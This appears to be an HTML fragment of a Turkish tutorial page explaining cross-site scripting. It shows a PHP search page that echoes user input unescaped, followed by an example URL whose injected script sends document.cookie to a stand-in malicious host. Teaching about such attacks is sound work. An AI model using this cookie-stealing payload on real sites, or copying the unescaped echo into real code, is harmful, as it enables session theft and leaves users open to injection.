<div class="content-item-big">
    <h2 class="h2b">Cross Site Scripting Nedir ?</h2>
    <div class="information-area">
        <h4 class="h4b" style="display: block">
            Kurban sitenin şöyle bir arama yapısı olduğunu düşünelim:
        </h4>
        <textarea class="code-area" rows="1">http://kurban.com/search.php?terim=elma</textarea>
        <h4 class="h4b" style="display: block">
            ve search.php'nin şöyle bir içeriği olsun.
        </h4>
        <textarea class="code-area" rows="5">
            "<html><head><title>Arama Sonuçları</title></head>
            <\?php echo $_GET['terim']; ?> için arama sonuçları:
            ...
            </body></html>"
        </textarea>
        <h4 class="h4b" style="display: block">Attacker şu şekilde bir arama url'si girerse ne olacak ? :</h4>
        <textarea class="code-area">
            http://kurban.com/search.php?terim=<script>window.open("http://zararlisite.com?cookie="+document.cookie)</script>
        </textarea>
        <h4 class="h4b" style="display: block">
            <ul>
                <li>Tarayıcı kurban.com/search.php'ye bağlanacak.</li>
                <li>Kurban.com zararlı kod içeren siteyi açan scripti kullanıcıya döndürecek</li>
                <li>Tarayıcı zararlisite.com'u açacak ve kurban.com için çerezleri zararlı siteye gönderecek.</li>
            </ul>
        </h4>
    </div>
</div>

<div class="content-item-big">
    <h2 class="h2b">Kötü Amaçlı Kod Enjekte Yöntemleri</h2>
    <div class="information-area">
        <h4 class="h4b">
            <ul>
                <li>Yansıtılmış XSS Saldırısı</li>
                <li>Depolanmış XSS Saldırısı</li>
                <li>Diğer DOM-tabanlı saldırılar</li>
            </ul>
        </h4>
    </div>
</div>